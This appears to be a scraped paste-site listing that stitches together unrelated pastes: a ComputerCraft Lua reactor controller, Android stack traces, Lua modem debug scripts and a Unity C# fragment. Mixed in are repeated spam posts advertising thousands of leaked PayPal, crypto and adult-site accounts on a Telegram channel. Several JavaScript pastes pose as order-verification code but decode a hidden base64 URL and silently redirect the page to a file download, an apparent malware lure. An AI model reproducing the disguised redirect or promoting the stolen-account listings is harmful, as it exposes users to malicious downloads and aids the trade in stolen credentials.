    local off = xoff
    drawBox({15, srf + 2}, off, 4, colors.gray)
    --drawFilledBox({12, srf}, off, 5,
    --	colors.red, colors.red)

    local tempUnit = (reactorVersion == ""Bigger Reactors"") and ""K"" or ""C""
    local tempFormat = ""%4s""..tempUnit

    local fuelRnd = math.floor(averageFuelTemp)
    local caseRnd = math.floor(averageCaseTemp)
    local fuelTr = math.floor(fuelRnd / 2000
            * (srf))
    local caseTr = math.floor(caseRnd / 2000
            * (srf))
    drawText("" Case "", off + 2, 5,
            colors.gray, colors.lightBlue)
    drawText("" Fuel "", off + 9, 5,
            colors.gray, colors.magenta)
    if (fuelTr > 0) then
        fuelTr = math.min(fuelTr, srf)
        drawFilledBox({6, fuelTr}, off + 8, srf + 5 - fuelTr,
                colors.magenta, colors.magenta)

        drawText(string.format(tempFormat, fuelRnd..""""),
                off + 10, srf + 6 - fuelTr,
                colors.magenta, colors.black)
    else
        drawText(string.format(tempFormat, fuelRnd..""""),
                off + 10, srf + 5,
                colors.black, colors.magenta)
    end

    if (caseTr > 0) then
        caseTr = math.min(caseTr, srf)
        drawFilledBox({6, caseTr}, off + 1, srf + 5 - caseTr,
                colors.lightBlue, colors.lightBlue)
        drawText(string.format(tempFormat, caseRnd..""""),
                off + 3, srf + 6 - caseTr,
                colors.lightBlue, colors.black)
    else
        drawText(string.format(tempFormat, caseRnd..""""),
                off + 3, srf + 5,
                colors.black, colors.lightBlue)
    end

    drawText(""Temperatures"", off + 2, 4,
            colors.black, colors.orange)
    drawBox({1, srf}, off + 7, 5,
            colors.gray)
end

local function drawGraph(name, offset)
    if (name == ""Energy Buffer"") then
        drawEnergyBuffer(offset)
    elseif (name == ""Control Level"") then
        drawControlLevel(offset)
    elseif (name == ""Temperatures"") then
        drawTemperatures(offset)
    end
end

local function drawGraphs()
    for i,v in pairs(graphsToDraw) do
        if (v + 15 < dim) then
            drawGraph(i,v)
        end
    end
end

local function drawStatus()
    if (dim <= -1) then
        return
    end
    drawBox({dim, sizey - 2},
            1, 1, colors.lightBlue)
    drawText("" Reactor Graphs "", dim - 18, 2,
            colors.black, colors.lightBlue)
    drawGraphs()
end

local function drawControls()
    if (sizey == 24) then
        drawBox({sizex - dim - 3, 9}, dim + 2, oo,
                colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1,
                colors.black, colors.cyan)
        drawText(""Reactor ""..(btnOn and ""Online"" or ""Offline""),
                dim + 10, 3 + oo,
                colors.black, btnOn and colors.green or colors.red)
        return
    end

    drawBox({sizex - dim - 3, 23}, dim + 2, oo,
            colors.cyan)
    drawText("" Reactor Controls "", dim + 7, oo + 1,
            colors.black, colors.cyan)
    drawFilledBox({20, 3}, dim + 7, 8 + oo,
            colors.red, colors.red)
    drawFilledBox({(maxb - minb) / 5, 3},
            dim + 7 + minb / 5, 8 + oo,
            colors.green, colors.green)
    drawText(string.format(""%3s"", minb..""%""), dim + 6 + minb / 5, 12 + oo,
            colors.black, colors.purple)
    drawText(maxb..""%"", dim + 8 + maxb / 5, 12 + oo,
            colors.black, colors.magenta)
    drawText(""Buffer Target Range"", dim + 8, 8 + oo,
            colors.black, colors.orange)
    drawText(""Min"", dim + 10, 14 + oo,
            colors.black, colors.purple)
    drawText(""Max"", dim + 22, 14 + oo,
            colors.black, colors.magenta)
    drawText(""Reactor "".. (btnOn and ""Online"" or ""Offline""),
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
end

local function drawStatistics()
    local oS = sizey - 13
    drawBox({sizex - dim - 3, sizey - oS - 1}, dim + 2, oS,
            colors.blue)
    drawText("" Reactor Statistics "", dim + 7, oS + 1,
            colors.black, colors.blue)

    --statistics
    drawText(""Generating : ""
            ..format(averageLastRFT)..""RF/t"", dim + 5, oS + 3,
            colors.black, colors.green)
    drawText(""RF Drain   ""
            ..(averageStoredThisTick <= averageLastRFT and ""> "" or "": "")
            ..format(averageRfLost)
            ..""RF/t"", dim + 5, oS + 5,
            colors.black, colors.red)
    drawText(""Efficiency : ""
            ..format(getEfficiency())..""RF/B"",
            dim + 5, oS + 7,
            colors.black, colors.green)
    drawText(""Fuel Usage : ""
            ..format(averageFuelUsage)
            ..""B/t"", dim + 5, oS + 9,
            colors.black, colors.green)
    drawText(""Waste      : ""
            ..string.format(""%7d mB"", waste),
            dim + 5, oS + 11,
            colors.black, colors.green)
end

--Draw a scene
local function drawScene()
    if (monSide == nil) then
        return
    end
    if (invalidDim) then
        mon.write(""Invalid Monitor Dimensions"")
        return
    end

    if (displayingGraphMenu) then
        drawGraphButtons()
    end
    drawControls()
    drawStatus()
    drawStatistics()
    t:draw()
end

--returns the side that a given peripheral type is connected to
local function getPeripheral(name)
    for i,v in pairs(peripheral.getNames()) do
        if (peripheral.getType(v) == name) then
            return v
        end
    end
    return """"
end

--Creates all the buttons and determines monitor size
local function initMon()
    monSide = getPeripheral(""monitor"")
    if (monSide == nil or monSide == """") then
        monSide = nil
        return
    end

    mon = peripheral.wrap(monSide)

    if mon == nil then
        monSide = nil
        return
    end

    resetMon()
    t = touchpoint.new(monSide)
    sizex, sizey = mon.getSize()
    oo = sizey - 37
    dim = sizex - 33

    if (sizex == 36) then
        dim = -1
    end
    if (pcall(addGraphButtons)) then
        displayingGraphMenu = true
    else
        t = touchpoint.new(monSide)
        displayingGraphMenu = false
    end
    local rtn = pcall(addButtons)
    if (not rtn) then
        t = touchpoint.new(monSide)
        invalidDim = true
    else
        invalidDim = false
    end
end

local function setRods(level)
    level = math.max(level, 0)
    level = math.min(level, 100)
    reactor.setAllControlRodLevels(level)
end

local function lerp(start, finish, t)
    -- Ensure t is in the range [0, 1]
    t = math.max(0, math.min(1, t))

    -- Calculate the linear interpolation
    return (1 - t) * start + t * finish
end

-- Function to calculate the average of an array of values
local function calculateAverage(array)
    local sum = 0
    for _, value in ipairs(array) do
        sum = sum + value
    end
    return sum / #array
end

-- Define PID controller parameters
local pid = {
    setpointRFT = 0,      -- Target RFT
    setpointRF = 0,      -- Target RF
    Kp = -.02,           -- Proportional gain (reduced from -0.08)
    Ki = -.0005,          -- Integral gain (reduced from -0.0015)
    Kd = -.005,         -- Derivative gain (reduced from -0.01)
    integral = 0,       -- Integral term accumulator
    lastError = 0,      -- Last error for derivative term
}

local function iteratePID(pid, error)
    local deadzone = 10
    if math.abs(error) < deadzone then
        return nil  -- No change needed
    end

    -- Proportional term
    local P = pid.Kp * error

    -- Integral term
    pid.integral = pid.integral + pid.Ki * error
    pid.integral = math.max(math.min(100, pid.integral), -100)

    -- Derivative term
    local derivative = pid.Kd * (error - pid.lastError)

    -- Calculate control rod level
    local rodLevel = math.max(math.min(P + pid.integral + derivative, 100), 0)

    -- Update PID controller state
    pid.lastError = error
    return rodLevel
end

local function updateRods()
    if (not btnOn) then
        return
    end
    local currentRF = storedThisTick
    local diffb = maxb - minb
    local minRF = minb / 100 * capacity
    local diffRF = diffb / 100 * capacity
    local diffr = diffb / 100
    local targetRFT = rfLost
    local currentRFT = lastRFT
    local targetRF = diffRF / 2 + minRF

    pid.setpointRFT = targetRFT
    pid.setpointRF = targetRF / capacity * 1000

    local errorRFT = pid.setpointRFT - currentRFT
    local errorRF = pid.setpointRF - currentRF / capacity * 1000

    local W_RFT = lerp(0.7, 0.3, (math.abs(targetRF - currentRF) / capacity / (diffr / 4)))
    W_RFT = math.max(math.min(W_RFT, 1), 0)

    local W_RF = (1 - W_RFT)  -- Adjust the weight for energy error

    -- Combine the errors with weights
    local combinedError = W_RFT * errorRFT + W_RF * errorRF
    local error = combinedError
    local rftRodLevel = iteratePID(pid, error)

    -- Set control rod levels
    setRods(rftRodLevel)
end

-- Saves the configuration of the reactor controller
local function saveToConfig()
    local file = fs.open(tag..""Serialized.txt"", ""w"")
    local configs = {
        maxb = maxb,
        minb = minb,
        rod = rod,
        btnOn = btnOn,
        graphsToDraw = graphsToDraw,
        XOffs = XOffs,
    }
    local serialized = textutils.serialize(configs)
    file.write(serialized)
    file.close()
end

local storedThisTickValues = {}
local lastRFTValues = {}
local rodValues = {}
local fuelUsageValues = {}
local wasteValues = {}
local fuelTempValues = {}
local caseTempValues = {}
local rfLostValues = {}

local function updateStats()
    storedLastTick = storedThisTick
    if (reactorVersion == ""Big Reactors"") then
        storedThisTick = reactor.getEnergyStored()
        lastRFT = reactor.getEnergyProducedLastTick()
        rod = reactor.getControlRodLevel(0)
        fuelUsage = reactor.getFuelConsumedLastTick() / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
        -- Big Reactors doesn't give us a way to directly query RF capacity through CC APIs
        capacity = math.max(capacity, reactor.getEnergyStored)
    elseif (reactorVersion == ""Extreme Reactors"") then
        local bat = reactor.getEnergyStats()
        local fuel = reactor.getFuelStats()

        storedThisTick = bat.energyStored
        lastRFT = bat.energyProducedLastTick
        capacity = bat.energyCapacity
        rod = reactor.getControlRodLevel(0)
        fuelUsage = fuel.fuelConsumedLastTick / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Bigger Reactors"") then
        storedThisTick = reactor.battery().stored()
        lastRFT = reactor.battery().producedLastTick()
        capacity = reactor.battery().capacity()
        rod = reactor.getControlRod(0).level()
        fuelUsage = reactor.fuelTank().burnedLastTick() / 1000
        waste = reactor.fuelTank().waste()
        fuelTemp = reactor.fuelTemperature()
        caseTemp = reactor.casingTemperature()
    end
    rfLost = lastRFT + storedLastTick - storedThisTick
    -- Add the values to the arrays
    table.insert(storedThisTickValues, storedThisTick)
    table.insert(lastRFTValues, lastRFT)
    table.insert(rodValues, rod)
    table.insert(fuelUsageValues, fuelUsage)
    table.insert(wasteValues, waste)
    table.insert(fuelTempValues, fuelTemp)
    table.insert(caseTempValues, caseTemp)
    table.insert(rfLostValues, rfLost)

    local maxIterations = 20 * secondsToAverage
    while #storedThisTickValues > maxIterations do
        table.remove(storedThisTickValues, 1)
        table.remove(lastRFTValues, 1)
        table.remove(rodValues, 1)
        table.remove(fuelUsageValues, 1)
        table.remove(wasteValues, 1)
        table.remove(fuelTempValues, 1)
        table.remove(caseTempValues, 1)
        table.remove(rfLostValues, 1)
    end

    -- Calculate running averages
    averageStoredThisTick = calculateAverage(storedThisTickValues)
    averageLastRFT = calculateAverage(lastRFTValues)
    averageRod = calculateAverage(rodValues)
    averageFuelUsage = calculateAverage(fuelUsageValues)
    averageWaste = calculateAverage(wasteValues)
    averageFuelTemp = calculateAverage(fuelTempValues)
    averageCaseTemp = calculateAverage(caseTempValues)
    averageRfLost = calculateAverage(rfLostValues)
end

--Initialize variables from either a config file or the defaults
local function loadFromConfig()
    invalidDim = false
    local legacyConfigExists = fs.exists(tag.."".txt"")
    local newConfigExists = fs.exists(tag..""Serialized.txt"")
    if (newConfigExists) then
        local file = fs.open(tag..""Serialized.txt"", ""r"")
        print(""Config file ""..tag..""Serialized.txt found! Using configurated settings"")

        local serialized = file.readAll()
        local deserialized = textutils.unserialise(serialized)
        
        maxb = deserialized.maxb
        minb = deserialized.minb
        rod = deserialized.rod
        btnOn = deserialized.btnOn
        graphsToDraw = deserialized.graphsToDraw
        XOffs = deserialized.XOffs
    elseif (legacyConfigExists) then
        local file = fs.open(tag.."".txt"", ""r"")
        local calibrated = file.readLine() == ""true""

        --read calibration information
        if (calibrated) then
            _ = tonumber(file.readLine())
            _ = tonumber(file.readLine())
        end
        maxb = tonumber(file.readLine())
        minb = tonumber(file.readLine())
        rod = tonumber(file.readLine())
        btnOn = file.readLine() == ""true""

        --read Graph data
        for i in pairs(XOffs) do
            local graph = file.readLine()
            local v1 = tonumber(file.readLine())
            local v2 = true
            if (graph ~= ""nil"") then
                v2 = false
                graphsToDraw[graph] = v1
            end

            XOffs[i] = {v1, v2}

        end
        file.close()
    else
        print(""Config file not found, generating default settings!"")

        maxb = 70
        minb = 30
        rod = 80
        btnOn = false
        if (monSide == nil) then
            btnOn = true
        end
        sizex, sizey = 100, 52
        dim = sizex - 33
        oo = sizey - 37
        enableGraph(""Energy Buffer"")
        enableGraph(""Control Level"")
        enableGraph(""Temperatures"")
    end
    btnOff = not btnOn
    reactor.setActive(btnOn)
end

local function startTimer(ticksToUpdate, callback)
    local timeToUpdate = ticksToUpdate * 0.05
    local id = os.startTimer(timeToUpdate)
    local fun = function(event)
        if (event[1] == ""timer"" and event[2] == id) then
            id = os.startTimer(timeToUpdate)
            callback()
        end
    end
    return fun
end


-- Main loop, handles all the events
local function loop()
    local ticksToUpdateStats = 1
    local ticksToRedraw = 4
    
    local hasClicked = false

    local updateStatsTick = startTimer(
        ticksToUpdateStats,
        function()
            updateStats()
            updateRods()
        end
    )
    local redrawTick = startTimer(
        ticksToRedraw,
        function()
            if (not hasClicked) then
                resetMon()
                drawScene()
            end
            hasClicked = false
        end
    )
    local handleResize = function(event)
        if (event[1] == ""monitor_resize"") then
            initMon()
        end
    end
    local handleClick = function(event)
        if (event[1] == ""button_click"") then
			t.buttonList[event[2]].func()
            saveToConfig()
            resetMon()
            drawScene()
            hasClicked = true
        end
    end
    while (true) do
        local event = (monSide == nil) and { os.pullEvent() } or { t:handleEvents() }

        updateStatsTick(event)
        redrawTick(event)
        handleResize(event)
        handleClick(event)
    end
end

local function detectReactor()
    -- Bigger Reactors V1.
    local reactor_bigger_v1 = getPeripheral(""bigger-reactor"")
    reactor = reactor_bigger_v1 ~= nil and peripheral.wrap(reactor_bigger_v1)
    if (reactor ~= nil) then
        reactorVersion = ""Bigger Reactors""
        return true
    end

    -- Bigger Reactors V2
    local reactor_bigger_v2 = getPeripheral(""BiggerReactors_Reactor"")
    reactor = reactor_bigger_v2 ~= nil and peripheral.wrap(reactor_bigger_v2)
    if (reactor ~= nil) then
        reactorVersion = ""Bigger Reactors""
        return true
    end

    -- Big Reactors or Extreme Reactors
    local reactor_extreme_or_big = getPeripheral(""BigReactors-Reactor"")
    reactor = reactor_extreme_or_big ~= nil and peripheral.wrap(reactor_extreme_or_big)
    if (reactor ~= nil) then
        reactorVersion = (reactor.mbIsConnected ~= nil) and ""Extreme Reactors"" or ""Big Reactors""
        return true
    end
    return false
end

--Entry point
local function main()
    term.setBackgroundColor(colors.black)
    term.clear()
    term.setCursorPos(1,1)

    local reactorDetected = false
    while (not reactorDetected) do
        reactorDetected = detectReactor()
        if (not reactorDetected) then
            print(""Reactor not detected! Trying again..."")
            sleep(1)
        end
    end
    
    print(""Reactor detected! Proceeding with initialization "")

    print(""Loading config..."")
    loadFromConfig()
    print(""Initializing monitor if connected..."")
    initMon()
    print(""Writing config to disk..."")
    saveToConfig()
    print(""Reactor initialization done! Starting controller"")
    sleep(2)

    term.clear()
    term.setCursorPos(1,1)
    print(""Reactor Controller Version ""..version)
    print(""Reactor Mod: ""..reactorVersion)
    --main loop

    loop()
end

main()

print(""script exited"")
sleep(1)"
xfE5Q2VF,PayPal with Balance,dentira,JavaScript,Wednesday 23rd of April 2025 06:08:14 PM CDT,18907 Accounts Posted On https://t.me/leakedbyeminem
gSyPcFnf,Products.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 06:07:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78454/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Pmqin4KN,Leaked Accounts - Fresh Hits,dentira,JavaScript,Wednesday 23rd of April 2025 05:52:52 PM CDT,83043 Accounts Posted On https://t.me/leakedbyeminem
VVEHGBzV,Order.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 05:50:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03222/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4PuWRBf7,Chaturbate with Tokens,dentira,JavaScript,Wednesday 23rd of April 2025 05:37:30 PM CDT,76686 Accounts Posted On https://t.me/leakedbyeminem
ihN9c07s,Market.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 05:35:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73894/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FctdB8NX,2025-04-23T17:28:36.108885,powerampache,PHP,Wednesday 23rd of April 2025 05:28:36 PM CDT,"1.01-79-play (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""album_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 581"",""errorType"":""filter""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsFromAlbum$2.invokeSuspend(SongsRepositoryImpl.kt:254)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getSongsFromAlbum() - {""errorAction"":""album_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 581"",""errorType"":""filter""}"
aaeHvbpF,2025-04-23T17:28:26.867092,powerampache,PHP,Wednesday 23rd of April 2025 05:28:27 PM CDT,"1.01-79-play (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""album_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 716"",""errorType"":""filter""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsFromAlbum$2.invokeSuspend(SongsRepositoryImpl.kt:254)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getSongsFromAlbum() - {""errorAction"":""album_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 716"",""errorType"":""filter""}"
8LFmD0m5,2025-04-23T17:22:40.202071,powerampache,PHP,Wednesday 23rd of April 2025 05:22:40 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""timeout\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""timeout\"" }"",""stackTrace"":[]}"
dytAUUnB,Crypto Accounts,dentira,JavaScript,Wednesday 23rd of April 2025 05:22:07 PM CDT,95643 Accounts Posted On https://t.me/leakedbyeminem
KnkARUPx,Untitled,x2LeaF,JavaScript,Wednesday 23rd of April 2025 05:19:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76984/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5gPK8XLX,PayPal with Balance,dentira,JavaScript,Wednesday 23rd of April 2025 05:06:38 PM CDT,53071 Accounts Posted On https://t.me/leakedbyeminem
zT4x7WXy,Leaked Accounts - Fresh Hits,dentira,JavaScript,Wednesday 23rd of April 2025 04:51:16 PM CDT,02191 Accounts Posted On https://t.me/leakedbyeminem
2NAsEs3V,Order.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 04:49:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41191/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZWSbhpYQ,Chaturbate with Tokens,dentira,JavaScript,Wednesday 23rd of April 2025 04:35:48 PM CDT,39762 Accounts Posted On https://t.me/leakedbyeminem
v5qZrTLb,Market.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 04:33:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81486/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WSggxyWs,Modem Debug Send,aelbrecht,Lua,Wednesday 23rd of April 2025 04:26:31 PM CDT,"-- Usage: send_debug <your message>

local modem = peripheral.find(""modem"")
local channel = 42

if not modem then
  print(""No modem found!"")
  return
end

local args = {...}
if #args == 0 then
  print(""Usage: send_debug <message>"")
  return
end

local message = table.concat(args, "" "")
modem.transmit(channel, 0, message)
print(""Sent: "" .. message)
"
awz3PuCL,Modem Debug Listener,aelbrecht,Lua,Wednesday 23rd of April 2025 04:25:21 PM CDT,"local modem = peripheral.find(""modem"") -- auto-detect the modem
local channel = 42

if not modem then
  print(""No modem found!"")
  return
end

modem.open(channel)
print(""Listening on channel "" .. channel)

while true do
  local event, side, senderChannel, replyChannel, message, distance = os.pullEvent(""modem_message"")
  if senderChannel == channel then
    print(""[DEBUG]"", textutils.serialize(message))
  end
end"
sB9Bipkq,Crypto Accounts,dentira,JavaScript,Wednesday 23rd of April 2025 04:20:26 PM CDT,60048 Accounts Posted On https://t.me/leakedbyeminem
Hbt1P44z,Untitled,x2LeaF,JavaScript,Wednesday 23rd of April 2025 04:18:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47756/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qSG34TEN,Stats Data Manager,Aetherboy,C#,Wednesday 23rd of April 2025 04:15:03 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class StatsDataManager : MonoBehaviour
{
    public static StatsDataManager Instance;

    List<int[]> matrixData = new List<int[]>();
    //order: ([level], [minas marcadas, minas destapadas,bloques eliminados,
    //                gemas obtenidas, gemas gastadas, enemigos, piso, objetos])

    const int numberOfStats = 8;

    int[] levelInfo= new int[numberOfStats];
    int[] temporalStats = new int[numberOfStats];
    int[] maxStats = new int[numberOfStats];
    int[] allTimeStats = new int[numberOfStats];

    void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
            DontDestroyOnLoad(gameObject);
        }
        else if (Instance != this)
            Destroy(gameObject);

        GetActiveData();

    }

